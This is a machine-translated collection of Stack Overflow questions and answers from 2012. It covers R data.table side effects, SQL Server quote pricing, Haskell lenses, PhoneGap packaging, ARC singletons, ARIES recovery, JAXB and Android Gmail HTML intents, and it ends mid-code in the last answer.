首先，是一个技术问题。想象一个被调用的 R 函数`proc1`，它接受一个`data.table`对象`x`作为其参数（可能还有其他参数）。`proc1`返回 NULL 但`x`使用`:=`. 据我了解，`proc1`调用只是因为承诺的工作方式而`proc1(x=x1)`复制。`x1`但是，如下所示，原始对象`x1`仍被 修改`proc1`。为什么/这是怎么回事？

```
> require(data.table)
> x1 <- CJ(1:2, 2:3)
> x1
   V1 V2
1:  1  2
2:  1  3
3:  2  2
4:  2  3
> proc1 <- function(x){
+ x[,y:= V1*V2]
+ NULL
+ }
> proc1(x1)
NULL
> x1
   V1 V2 y
1:  1  2 2
2:  1  3 3
3:  2  2 4
4:  2  3 6
> 
```

此外，似乎 using`proc1(x=x1)`并不比直接在 x 上执行该过程慢，这表明我对 Promise 的模糊理解是错误的，并且它们以传递引用的方式工作：

```
> x1 <- CJ(1:2000, 1:500)
> x1[, paste0("V",3:300) := rnorm(1:nrow(x1))]
> proc1 <- function(x){
+ x[,y:= V1*V2]
+ NULL
+ }
> system.time(proc1(x1))
   user  system elapsed 
   0.00    0.02    0.02 
> x1 <- CJ(1:2000, 1:500)
> system.time(x1[,y:= V1*V2])
   user  system elapsed 
   0.03    0.00    0.03 
```

因此，鉴于将 data.table 参数传递给函数不会增加时间，这使得为 data.table 对象编写过程成为可能，同时结合了 data.table 的速度和函数的通用性。但是，鉴于 John Chambers 所说，函数不应该有副作用，在 R 中编写这种类型的程序编程真的“可以”吗？为什么他认为副作用是“坏的”？如果我要忽略他的建议，我应该注意哪些陷阱？我能做些什么来编写“好”的 data.table 程序？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-12-07T03:53:15.573

是的，s 中列的添加、修改、删除`data.table`是由`reference`. 从某种意义上说，这是一件*好事*，因为 a`data.table`通常会保存大量数据，并且每次对其进行更改时都重新分配它会非常耗费内存和时间。另一方面，这是一件*坏事*，因为它违背了`no-side-effect`R 试图`pass-by-value`通过默认使用来推广的函数式编程方法。使用无副作用编程，调用函数时无需担心：您可以放心，您的输入或您的环境不会受到影响，您可以只关注函数的输出。它很简单，因此很舒服。

当然，如果您知道自己在做什么，可以无视 John Chambers 的建议。关于编写“好的” data.tables 程序，如果我是你，我会考虑以下几条规则，作为限制复杂性和副作用数量的一种方式：

*   一个函数不应修改多个表，即修改该表应该是唯一的副作用，
*   如果一个函数修改了一个表，则将该表作为函数的输出。当然，您不会想重新分配它：只需运行`do.something.to(table)`而不是`table <- do.something.to(table)`. 相反，如果该函数有另一个（“真实”）输出，那么在调用 时`result <- do.something.to(table)`，很容易想象您如何将注意力集中在输出上，而忘记调用该函数会对您的桌子产生副作用。

虽然“一个输出/无副作用”功能是 R 中的规范，但上述规则允许“一个输出或副作用”。如果您同意副作用在某种程度上是一种输出形式，那么您就会同意我并没有过多地违反规则，松散地坚持 R 的单输出函数式编程风格。允许函数有多种副作用会有点牵强；并不是说你不能这样做，但如果可能的话，我会尽量避免它。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-12-07T11:18:16.830

文档可以改进（非常欢迎提出建议），但这是目前的内容。也许它应该说“即使在功能内”？

在`?":="`：

> :=、setkey 或任何其他 set* 函数不会在更改时复制 data.tables。见副本。
> 
> 通过引用修改 DT 并返回新值。如果需要副本，请先获取副本（使用 DT2=copy(DT)）。回想一下，这个包适用于大数据（混合列类型，具有多列键），其中通过引用进行更新可能比复制整个表快很多数量级。

并且在`?copy`（但我意识到这与 setkey 混淆了）：

> 输入通过引用修改，并返回（不可见），因此可以在复合语句中使用；例如，setkey(DT,a)[J("foo")]。如果需要副本，请先获取副本（使用 DT2=copy(DT)）。在 := 用于通过引用对列进行子分配之前，copy() 有时也可能很有用。见？复制。请注意， setattr 也在包位中。这两个包仅在 C 级别公开了 R 的内部 setAttrib 函数，但返回值不同。bit::setattr 返回 NULL（不可见）以提醒您该函数用于其副作用。data.table::setattr 返回更改的对象（不可见），用于复合语句。

有趣的是，最后两句话`bit::setattr`与弗洛德尔的第 2 点有关。

另请参阅这些相关问题：

[准确了解 data.table 何时是对另一个 data.table 的引用（相对于副本）](https://stackoverflow.com/q/10225098/403310)
[通过引用传递：data.table 包](https://stackoverflow.com/q/8030452/403310)
[data.table 1.8.1 中的 := 运算符：“DT1 = DT2”不是与 DT1 = 复制（DT2）相同吗？](https://stackoverflow.com/q/11192325/403310)

我非常喜欢你问题的这一部分：

> 这使得为​​ data.table 对象编写过程成为可能，同时结合了 data.table 的速度和函数的通用性。

是的，这绝对是意图之一。考虑数据库的工作方式：许多不同的用户/程序通过引用（插入/更新/删除）数据库中的一个或多个（大）表来更改。这在数据库领域工作得很好，更像是 data.table 的想法。因此主页上的 svSocket 视频，以及对 and 的渴望`insert`（`delete`通过引用，仅动词，副作用函数）。

# sql - 根据同一张表中是否存在另一个价格来确定价格何时过时

> ID：13756181
> 
> 赞同：0
> 
> 时间：2012-12-07T02:43:16.497
> 
> 标签：sql, sql-server-2008-r2

我在 SQL Server 中遇到了一个未返回正确数据的查询问题。我很高兴提前承认，我应该能够看到一个简单而简洁的解决方案，但我认为我一直在想事情。

业务场景是我们正在比较我们为给定项目收取的价格与我们报价的价格。这是查询：

```
SELECT  ipl1.Id AS Id,
        CASE s1.FirstName WHEN '' THEN s1.LastName ELSE s1.LastName + ', ' + s1.FirstName END AS SupplierName,
        p1.Date,
        p1.OrderNo,
        p1.InvoiceNo,
        i1.Number AS ItemNumber,
        i1.Name AS ItemName,
        ipl1.Quantity,
        ROUND(ipl1.TaxExclusiveUnitPrice, 2) AS PriceCharged,
        ROUND(ISNULL(p2.Amount, p4.Amount), 2) AS PriceQuoted,
        ROUND(ROUND(ipl1.TaxExclusiveUnitPrice, 2) - ROUND(ISNULL(p2.Amount, p4.Amount), 2), 2) AS Difference,
        ipl1.Quantity*ROUND(ROUND(ipl1.TaxExclusiveUnitPrice, 2) - ROUND(ISNULL(p2.Amount, p4.Amount), 2), 2) AS Overcharge,
        ISNULL(p2.Starts, p4.Starts) AS QuoteDate,
        ISNULL(p2.QuoteNo, p4.QuoteNo) AS QuoteNumber
FROM    pl_ItemPurchaseLines ipl1
        INNER JOIN
        pl_Purchases p1 ON p1.Id=ipl1.Purchase_Id
        INNER JOIN
        pl_Suppliers s1 ON s1.Id=p1.Supplier_Id 
        INNER JOIN
        pl_Items i1 ON i1.Id=ipl1.Item_Id 
        LEFT JOIN
        --- First Priority is the lowest Amount Current Quote or List Price
        (
        SELECT  p1.Id,
                p1.Amount,
                p1.Starts,
                p1.Expires,
                p1.QuoteNo,
                ipl.Id AS ItemPurchaseLine_Id,
                row_number() over (partition by ipl.Id order by p1.Amount ASC, p1.QuoteNo DESC, p1.Starts DESC) as Row
        FROM    pl_ItemPurchaseLines ipl
                INNER JOIN
                pl_Purchases p ON p.Id=ipl.Purchase_Id
                INNER JOIN 
                pl_Prices p1 ON p1.Starts<=p.Date AND 
                                ((p1.Expires>=p.Date AND p1.QuoteNo<>'') OR
                                 (p1.Expires IS NULL AND p1.QuoteNo='')) AND
                                 p1.Item_Id=ipl.Item_Id
        ) AS p2 ON  p2.Row = 1 AND
                    ipl1.Id=p2.ItemPurchaseLine_Id
        LEFT JOIN           
        (
        SELECT  p3.Id,
                p3.Amount,
                p3.Starts,
                p3.Expires,
                p3.QuoteNo,
                ipl2.Id AS ItemPurchaseLine_Id,
                row_number() over (partition by ipl2.Id order by p3.Expires DESC) as Row
        FROM    pl_ItemPurchaseLines ipl2
                INNER JOIN
                pl_Purchases p2 ON p2.Id=ipl2.Purchase_Id
                INNER JOIN 
                pl_Prices p3 ON p3.Starts<=p2.Date AND 
                                p3.QuoteNo<>'' AND
                                p3.Item_Id=ipl2.Item_Id
        ) AS p4 ON  p4.Row = 1 AND
                    ipl1.Id=p4.ItemPurchaseLine_Id 
```

问题的核心在于子查询。有 2 种价格，一种是有开始日期、没有到期日的标价和 '' 的报价，并被后一个标价取代；或具有开始日期、到期日期和报价编号的报价。

问题出在第一个子查询中。在这里，我正在寻找价格最低的仍然有效的报价或标价，但是，我无法弄清楚如何排除被取代的标价，即带有 quoteno='' 且到期为空的价格（这些很容易）以及其他具有相同 ID 且开始日期较晚的价目表。

我曾考虑根据触发器在表格中设置到期日期，但我对此有一些困难，因为需要处理同时出现 2 个后面的价目表的可能性（甚至更早的价目表 - 我们正在向后工作以及前锋）。

我可以在给定价格 id 时编写一个函数来确定它是否在给定日期被取代，但这似乎不是最理想的。

我觉得我只需要对 where 子句做点什么来让这些被取代的价格消失，但我已经做了一些尝试，并建立了一些不起作用的冗长的巴洛克式子句！

以下是一些示例数据：

```
-- No there isn't I will put some up as soon as I format it -- 
```

以下是表定义：

```
USE [tempdb]
GO

SET ANSI_NULLS ON
GO

SET QUOTED_IDENTIFIER ON
GO

CREATE TABLE [dbo].[pl_Suppliers](
    [Id] [int] IDENTITY(1,1) NOT NULL,
    [LastName] [nvarchar](100) NOT NULL,
    [FirstName] [nvarchar](100) NOT NULL,
    [ShortName] [nvarchar](100) NOT NULL,
    [Prefix] [nvarchar](100) NOT NULL,
    [UserID] [nvarchar](100) NOT NULL,
    [Password] [nvarchar](1000) NOT NULL,
    [SentToMyob] [bit] NOT NULL,
 CONSTRAINT [PK_Suppliers] PRIMARY KEY CLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]

GO

CREATE TABLE [dbo].[pl_ItemPurchaseLines](
    [Id] [int] IDENTITY(1,1) NOT NULL,
    [Quantity] [float] NOT NULL,
    [TaxExclusiveUnitPrice] [float] NOT NULL,
    [TaxExclusiveTotal] [float] NOT NULL,
    [TaxInclusiveTotal] [float] NOT NULL,
    [TaxBasisAmount] [float] NOT NULL,
    [TaxCode] [nvarchar](max) NOT NULL,
    [Received] [float] NOT NULL,
    [TaxInclusiveUnitPrice] [float] NOT NULL,
    [Purchase_Id] [int] NOT NULL,
    [Item_Id] [int] NOT NULL,
 CONSTRAINT [PK_pl_ItemPurchaseLines] PRIMARY KEY NONCLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO

CREATE TABLE [dbo].[pl_Purchases](
    [Id] [int] IDENTITY(1,1) NOT NULL,
    [OrderNo] [nvarchar](max) NOT NULL,
    [InvoiceNo] [nvarchar](max) NOT NULL,
    [Date] [datetime] NOT NULL,
    [ShipToAddressLine1] [nvarchar](max) NOT NULL,
    [ShipToAddressLine2] [nvarchar](max) NOT NULL,
    [ShipToAddressLine3] [nvarchar](max) NOT NULL,
    [ShipToAddressLine4] [nvarchar](max) NOT NULL,
    [Comment] [nvarchar](max) NOT NULL,
    [TotalLines] [float] NOT NULL,
    [TotalTax] [float] NOT NULL,
    [Supplier_Id] [int] NOT NULL,
    [SentToMyob] [bit] NOT NULL,
    [Job_ID] [int] NULL,
 CONSTRAINT [PK_Purchases] PRIMARY KEY CLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO

CREATE TABLE [dbo].[pl_Items](
    [Id] [int] IDENTITY(1,1) NOT NULL,
    [Number] [nvarchar](100) NOT NULL,
    [Name] [nvarchar](255) NOT NULL,
    [Supplier_Id] [int] NOT NULL,
    [SentToMyob] [bit] NOT NULL,
 CONSTRAINT [PK_Items] PRIMARY KEY NONCLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO

CREATE TABLE [dbo].[pl_Prices](
    [Id] [int] IDENTITY(1,1) NOT NULL,
    [Amount] [float] NOT NULL,
    [Starts] [datetime] NOT NULL,
    [Expires] [datetime] NULL,
    [QuoteNo] [nvarchar](100) NOT NULL,
    [Item_Id] [int] NOT NULL,
 CONSTRAINT [PK_Prices] PRIMARY KEY CLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]

GO

ALTER TABLE [dbo].[pl_Prices]  WITH CHECK ADD  CONSTRAINT [FK_ItemPrice] FOREIGN KEY([Item_Id])
REFERENCES [dbo].[pl_Items] ([Id])
ON DELETE CASCADE
GO

ALTER TABLE [dbo].[pl_Prices] CHECK CONSTRAINT [FK_ItemPrice]
GO
ALTER TABLE [dbo].[pl_Items]  WITH CHECK ADD  CONSTRAINT [FK_SupplierItem] FOREIGN KEY([Supplier_Id])
REFERENCES [dbo].[pl_Suppliers] ([Id])
GO

ALTER TABLE [dbo].[pl_Items] CHECK CONSTRAINT [FK_SupplierItem]
GO

ALTER TABLE [dbo].[pl_Items] ADD  CONSTRAINT [DF_pl_Items_SentToMyob]  DEFAULT ((0)) FOR [SentToMyob]
GO

ALTER TABLE [dbo].[pl_Purchases]  WITH CHECK ADD  CONSTRAINT [FK_PurchasesSuppliers] FOREIGN KEY([Supplier_Id])
REFERENCES [dbo].[pl_Suppliers] ([Id])
GO

ALTER TABLE [dbo].[pl_Purchases] CHECK CONSTRAINT [FK_PurchasesSuppliers]
GO

ALTER TABLE [dbo].[pl_Purchases] ADD  CONSTRAINT [DF_pl_Purchases_SentToMyob]  DEFAULT ((0)) FOR [SentToMyob]
GO

ALTER TABLE [dbo].[pl_ItemPurchaseLines]  WITH CHECK ADD  CONSTRAINT [FK_ItemPurchaseLineItem] FOREIGN KEY([Item_Id])
REFERENCES [dbo].[pl_Items] ([Id])
GO

ALTER TABLE [dbo].[pl_ItemPurchaseLines] CHECK CONSTRAINT [FK_ItemPurchaseLineItem]
GO

ALTER TABLE [dbo].[pl_ItemPurchaseLines]  WITH CHECK ADD  CONSTRAINT [FK_Purchase_ItemPurchaseLines] FOREIGN KEY([Purchase_Id])
REFERENCES [dbo].[pl_Purchases] ([Id])
ON DELETE CASCADE
GO

ALTER TABLE [dbo].[pl_ItemPurchaseLines] CHECK CONSTRAINT [FK_Purchase_ItemPurchaseLines]
GO

ALTER TABLE [dbo].[pl_Suppliers] ADD  CONSTRAINT [DF_pl_Suppliers_SentToMyob]  DEFAULT ((0)) FOR [SentToMyob]
GO 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T14:58:13.147

您的解决方案在子选择中有一个错误：p1.Item_Id=p1.Item_Id 这仅引用“子选择”表“p1”而不是“外部选择”表“p”

任何带有子选择的解决方案都不适用于大型数据集。

假设适当的索引，这样的事情将是可扩展的：

```
SELECT p.[Id]
  ,p.[Amount]
  ,p.[Starts] 
  ,ISNULL(p.Expires, DATEADD(DAY,-1,MIN(p1.Starts))
  ,p.[QuoteNo]
  ,p.[Item_Id]
FROM    pl_Prices p

LEFT JOIN pl_Prices p1 ON
     p1.Item_Id=p.Item_Id AND    
     p1.Starts>p.Starts
GROUP BY 
      p.[Id]
      ,p.[Amount]
      ,p.[Starts] 
      ,p.[QuoteNo]
      ,p.[Item_Id] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T05:14:43.123

我想通了——正如我所料，这很简单。

我创建了这个视图，并在第一个子查询中引用了它。

```
ALTER VIEW [dbo].[pl_PricesWithExpiry]
AS
SELECT [Id]
      ,[Amount]
      ,[Starts] 
      ,ISNULL(p.Expires, (SELECT DATEADD(DAY,-1,MIN(p1.Starts))
                          FROM pl_Prices p1
                          WHERE p1.Item_Id=p.Item_Id AND
                          p1.Starts>p.Starts)) AS Expires
      ,[QuoteNo]
      ,[Item_Id]
FROM    pl_Prices p 
```

# haskell - 部分镜片的组成

> ID：13756188
> 
> 赞同：7
> 
> 时间：2012-12-07T02:44:22.450
> 
> 标签：haskell, lenses

我试图找出最简洁的方法来修改嵌套在`Maybe`类型（或其他用于建模偏爱的类型）中的值。

这是示例设置：

```
{-# LANGUAGE TemplateHaskell #-}

import Control.Lens

data Outer = Outer { _inner :: Maybe Inner }
  deriving (Show)

data Inner = Inner { _foo :: Int }
  deriving (Show)

makeLenses ''Outer
makeLenses ''Inner 
```

通过以下方式以有点混乱的方式很容易做到这一点`lens`：

```
wibble :: Outer -> Maybe Outer
wibble o = do i <- view inner o
              let i' = over foo succ i
              return $ set inner (Just i') o 
```

为了说明为什么这很讨厌，这就是我希望能够写的内容：

```
wibble' :: Outer -> Maybe Outer
wibble' = overish inner.foo succ

overish = ??? 
```

查找字段失败只会导致整个操作失败，而不是让我在可能发生的每个点显式检查失败。

有什么建议么？我试过浏览各种`lens`模块，但似乎没有什么能完全符合要求。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-07T03:21:46.030

您可以使用`over (inner.traverse.foo)`写入嵌套字段。但是，这不会以您想要的方式报告失败，因为它成功地映射了所有 0 个目标。

`traverse`（来自`Data.Traversable`，由 重新导出`Control.Lens`） 这里给你一个`Traversal`供你走过去的`Maybe`。

您可以从中读取`(^?)`以查看镜头的目标是否存在。

我们可以通过使用现有的镜头组合器分别读写来解决这个问题，但我们可以直接构建这样的组合器：

```
import Data.Monoid (Any(..))
import Control.Monad (guard)

overish :: LensLike ((,) Any) s t a b -> (a -> b) -> s -> Maybe t
overish l f s = case l (\a -> (Any True, f a)) s of
  (Any r, t) -> t <$ guard r 
```

你也可以这样写`l %%~ \a -> (Any True, f a)`。

您可以使用 轻松检查 a`Traversal`是否没有目标`nullOf`，但这需要两次通过和更高等级的类型：

```
overish :: Traversal s t a b -> (a -> b) -> s -> Maybe t
overish l f s = over l f s <$ guard (not (nullOf l s)) 
```

这实际上只是检查是否有目标，然后如果有目标，则将 setter 应用于它。

然后你可以使用

```
overish (inner.traverse.foo) succ 
```

# jquery - Phonegap 2.2 Windows 8：使用 Win 证书工具包的 Win Store 应用程序包 - 失败并出现错误

> ID：13756189
> 
> 赞同：2
> 
> 时间：2012-12-07T02:44:22.163
> 
> 标签：jquery, cordova, windows-store-apps, indexeddb

我使用适用于 Windows 8 的 Visual Studio 2012 为 Windows 商店构建了 Javascript 空白应用程序（默认不带 WinJS）。

此应用程序中使用的技术是：

*   jQuery 1.8.3。
*   jQuery 移动 1.1.0
*   HTML5/CSS3
*   Javascript
*   索引数据库
*   电话间隙

该应用程序在 Win 8 模拟器中运行良好。但是，当我创建要上传到商店并通过 Windows 证书工具包进行验证的应用程序包时，它会显示以下错误：

*   Javascript 语法错误的字节码生成。（虽然它在 Chrome 浏览器中运行良好，没有任何 Javascript 错误）
*   未完成对 UTF-8 的编码。

根据 Microsoft 文档，我们可以使用 jQuery/jQuery Mobile 创建应用程序并将其提交到 App Store，但认证测试仅指出这些文件的错误。

我们还为此尝试了另一种方法，即在 Windows 8 上使用 Phonegap 2.2.0，但在创建应用程序包时出现了相同的错误。根据[http://docs.phonegap.com/en/2.2.0/guide_getting-started_windows-8_index.md.html#Getting%20Started%20with%20Windows%208](http://docs.phonegap.com/en/2.2.0/guide_getting-started_windows-8_index.md.html#Getting%20Started%20with%20Windows%208)

如果在生成要提交到 App Store 的应用程序包之前需要遵循任何步骤，请向我们提供文档。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T08:01:21.207

尝试将出现错误的文件保存为 UTF-8 编码文件。我认为您可以在另存为时执行此操作。

# objective-c - 将现有单例升级到 ARC

> ID：13756192
> 
> 赞同：1
> 
> 时间：2012-12-07T02:44:59.333
> 
> 标签：objective-c, singleton, automatic-ref-counting

在 Objective-C 中，如何使用 ARC 编写单例？在ARC中，不允许覆盖release、autorelease、retain、retainCount方法，如何避免一个对象被释放？我知道没有 ARC，一个经典的单身人士会喜欢下面：

```
@interface SingletonObject
+ (SingletonObject*)sharedObject;
@end

SingletonObject *sharedObj;

@implementation SingletonObject
+ (id)allocWithZone:(NSZone *)zone
{
    if (sharedObj == nil) {
        //So the code [[SingletonObject alloc] init] is equal with [SingletonObject sharedObject]
        sharedObj = [super allocWithZone:zone];
    }
    return sharedObj; 
}

+ (void)initialize
{
    if (self == [SingletonObject class]) {
        sharedObj = [[SingletonObject alloc] init];
    }
}

+ (SingletonObject*)sharedObject
{
    return sharedObj;
}
- (id)retain
{
    return self;
}

- (unsigned)retainCount
{
    return UINT_MAX;  //denotes an object that cannot be released
}

- (oneway void)release
{
    //do nothing
}

- (id)autorelease
{
    return self;
}

- (id)init {
    self  = [super init];
    if (self) {
       //... 
    }
    return self;
}

@end 
```

仅删除保留、保留计数、释放、自动释放方法是否安全？谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-07T16:14:53.477

你只需要一个方法来实现一个支持单例模式的类：

```
+ (instancetype)sharedInstance
{
    static id _sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        _sharedInstance = [[self alloc] init];
    });
    return _sharedInstance;
} 
```

将其复制/粘贴到任何类中，它将有一个共享实例。除此之外的任何代码都只是增加了实际上没有必要的复杂性。我有时会补充：

```
- (void)dealloc
{
     *(char*)0x42 = 'b';
     // no super, ARC all the way
} 
```

如果我的共享实例由于错误而被释放，那将导致非常具体的崩溃。（是的，十六进制 0x42 不是 42，但它在崩溃日志的寄存器中留下了一个不错的 0x000000042，从而可以立即识别发生了什么。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:41:04.510

是的。

`-sharedObject`不过应该是`+sharedObject`（类方法）。只要确保你总是使用它。

# database - 在 ARIES 恢复方法中重复历史有什么好处？

> ID：13756196
> 
> 赞同：3
> 
> 时间：2012-12-07T02:45:25.073
> 
> 标签：database, algorithm, rdbms, recovery, aries

在[ARIES 算法](http://en.wikipedia.org/wiki/Algorithms_for_Recovery_and_Isolation_Exploiting_Semantics)中，为什么需要在 redo pass 中重复崩溃前的所有历史？我可以在分析过程中获取已提交的事务编号，然后重做已提交的事务日志记录吗？这种方法将减少需要重做和撤消的记录数。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T02:35:37.083

## 简短的回答：

我们需要在重做过程中重复崩溃之前的所有历史记录，以确保执行撤消过程之前的数据库一致性。

## 长答案：

[恢复算法 ARIES](http://en.wikipedia.org/wiki/Algorithms_for_Recovery_and_Isolation_Exploiting_Semantics)，为了保证 DBMS 的原子性和持久性，执行 3 遍：

1.  **分析通行证**：看看需要做什么（播放日志转发）
2.  **Redo pass**：确保磁盘反映日志中但不在磁盘上的任何更新，包括属于最终将回滚的事务的更新。这样可以确保我们处于***一致的状态***，这将允许逻辑撤消。
3.  **Undo pass** : 删除任何丢失交易的动作

UNDO 数据日志是逻辑的，而 REDO 数据日志是物理的：

*   我们必须进行物理重做，因为我们不能保证数据库处于一致状态（例如，记录“INSERT VALUE X INTO TABLE Y”可能不是一个好主意，因为 X 可能会反映在索引中，但不是表格，反之亦然，以防插入时发生崩溃）
*   我们可以做逻辑UNDO，因为在REDO之后我们知道事情是一致的。事实上，我们必须进行逻辑 UNDO，因为我们只 UNDO 一些操作，并且物理记录形式的 UNDO，例如，“拆分索引 y 的页面 x”在索引管理或不变量方面可能不再是正确的做法维护。在重做期间我们不必担心这一点，因为我们重复历史并重播所有内容，这意味着上次对数据库所做的任何物理修改仍然是正确的。

[资源](http://db.csail.mit.edu/6.830/notes.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T15:55:01.043

原因是因为 ARIES 被设计为使用无暴力/偷窃方法。“窃取”部分意味着来自未提交事务的更改可能会写入磁盘。因此，我们需要重做所有已提交和未提交的事务，以便我们可以撤消未提交的事务。

# java - 类似xml文件的JAXB解析

> ID：13756197
> 
> 赞同：1
> 
> 时间：2012-12-07T02:45:37.263
> 
> 标签：java, jaxb, jaxb2, jaxb2-basics

我有不同的 XML 返回，我想用带有注释类的 JAXB 进行解析。许多 XML 文件共享相似的顶层结构，并且内部标记的内容可能会有所不同。由于我们向 ContextInstance 发送了一个类而不是一个实例，因此我无法添加类。

给定这样的两个文件的示例，您将如何创建一组不会每次都重复顶级 xml 的 JAXB 注释。

```
<?xml version='1.0' encoding='UTF-8'?>
<eveapi version="2">
  <currentTime>2008-11-24 20:14:29</currentTime>
  <result>
    <serverOpen>True</serverOpen>
    <onlinePlayers>38102</onlinePlayers>
  </result>
  <cachedUntil>2008-11-24 20:17:29</cachedUntil>
</eveapi> 
```

还有一个像这样的文件：

```
<?xml version='1.0' encoding='UTF-8'?>
<eveapi version="2">
  <currentTime>2012-02-12 14:39:12</currentTime>
  <result>
    <rowset name="characters" key="characterID"     columns="name,characterID,corporationName,corporationID">
      <row name="Alexis Prey" characterID="1365215823" corporationName="Puppies To the     Rescue" corporationID="238510404"/>
    </rowset>
  </result>
  <cachedUntil>2012-02-12 15:27:00</cachedUntil>
</eveapi> 
```

一个常见的顶级课程就像

```
@XmlRootElement(name="eveapi")
public class EveApiConfig {
    @XmlElement(required = true)
    protected Date currentTime;

    @XmlElement(required = true)
    protected String cachedUntil;

    @XmlAttribute(name = "version", required = true)
    protected int version;

    @XmlElement(required = true)
    protected ResultsConfig result;
} 
```

但是 ResultsConfig 将是其他一些东西。这几乎就像需要一个反向 X​​mlSeeAlso

如果如何做到这一点有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-02T20:19:37.757

我认为你可以通过几个对象工厂来实现这一点。我将勾勒出解决方案：

*   做`result`一个`@XmlElementRef`, 用类似的东西输入`JAXBElement<AbstractResultConfig>`
*   每个案例创建一个带有`ObjectFactory`
*   哪些`ObjectFactory`类实现了不同的`@XmlElementDecl`工厂方法，该方法将创建`JAXBElement`s 的不同子类的实例`AbstractResultConfig`。就像是：

    ```
    @XmlElementDecl(name = "Result")
    public JAXBElement<ResultConfigImpl> createResultConfigImpl(ResultConfigImpl value) {
        return new JAXBElement<ResultConfigImpl>(..., ResultConfigImpl.class, null, value);
    } 
    ```

我想你需要将它与`createResultConfig()`方法或类似的东西配对。

# android - 使用 Gmail 4.2.1 发送 HTML 电子邮件

> ID：13756200
> 
> 赞同：24
> 
> 时间：2012-12-07T02:46:02.233
> 
> 标签：android, gmail

似乎 Gmail 4.2.1 可能破坏了 HTML 格式的电子邮件。以下代码在 4.2.1 之前完美运行。从 Gmail 发送的电子邮件具有所需的嵌入式链接、粗体和带下划线的字词。不幸的是，在更新到 4.2.1 之后，发送的电子邮件看起来好像所有的 HTML 格式都被删除了。我希望可能有人找到解决方法？

```
final Intent intent = new Intent(Intent.ACTION_SEND);
intent.setType("message/rfc822");
String[] toArr = new String[] { "someone@somewhere.com" };
intent.putExtra(Intent.EXTRA_EMAIL, toArr);
intent.putExtra(Intent.EXTRA_SUBJECT, "This is a subject");
intent.putExtra(Intent.EXTRA_TEXT, Html.fromHtml("Hello, here is some <b>bold text</b> some <u>underline text</u> and <a href=\"http://www.google.com\">a link</a>.")); 
```

有趣的事情（或者可能不是？）是这封电子邮件的撰写预览显示了所有粗体、下划线和链接的文本，正如人们所期望的那样。但是当它被发送时，收件人会收到一封去掉所有内容的电子邮件。

是的，我知道关于[此的另一个问题](https://stackoverflow.com/questions/13712454/did-android-gmail-4-2-1-break-html-intents)已关闭。我认为它可能过早关闭，我希望这里的额外细节可能值得再看一次。

更多信息：经过进一步研究，这个问题比仅仅通过意图发送 HTML 电子邮件要大得多。如果使用具有某些格式（粗体、下划线、超链接等）的 GMail 网络应用程序创建草稿电子邮件，然后在您的 GMail Android 应用程序（v4.2.1）上打开该草稿电子邮件，您的所有格式都会显示被保留。但是，如果您随后使用 GMail Android 应用程序发送该电子邮件草稿，则在发送电子邮件之前，您的所有格式都将被删除。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T11:34:37.070

这几乎可以肯定是 GMail 4.2.1 中的一个错误。

截至 2013 年 3 月 19 日，GMail 4.3 发布，似乎修复了该错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-25T22:33:58.070

我很抱歉你也遇到了这个，斯科特。我在 12 月向 Google 提交了一份错误报告，但这似乎是一个黑洞。

我需要嵌入超链接。我最好的解决方法是发送 text/plain 或 message/rfc822 电子邮件，其中 URL 为消息中的纯文本。奇怪的是，Gmail 识别出这一点并尝试将其包含在 <a></a> 标记中。使用这种方法，我可以获得收件人发送和点击的链接，但它看起来像废话。

对 URL 进行格式化以使 Gmail 能够识别链接的整个文本并正确包含它也是一个挑战。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-23T16:36:08.940

在阅读了您的问题后，我为这个问题浏览了很多，我在[**这里**](http://blog.blundell-apps.com/html-in-an-email-intent/)找到了它。它实际上显示了格式化 Gmail 正文的方式和原因。您也可以结帐链接。

我希望它会帮助你。

谢谢。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-30T04:49:50.383

```
private void sendMail(String appName, String playStoreLink) {
    String msg = "<HTML><BODY>Hello,<br>Recently,I downloaded <b><font color=\"red\">"+appName+"</font></b>"+
" from Play Store.I found this very challenging and a great game."+
            "<br>I would like to suggest you this game.<br><br><a href="+playStoreLink+">Download</a><br><br>"+
"<br>Thank You</BODY></HTML>";
    String sub = "Get it now. It is there in Play Store";
    Intent email = new Intent(Intent.ACTION_SEND);
    email.setType("text/html");
    email.putExtra(Intent.EXTRA_SUBJECT, sub);
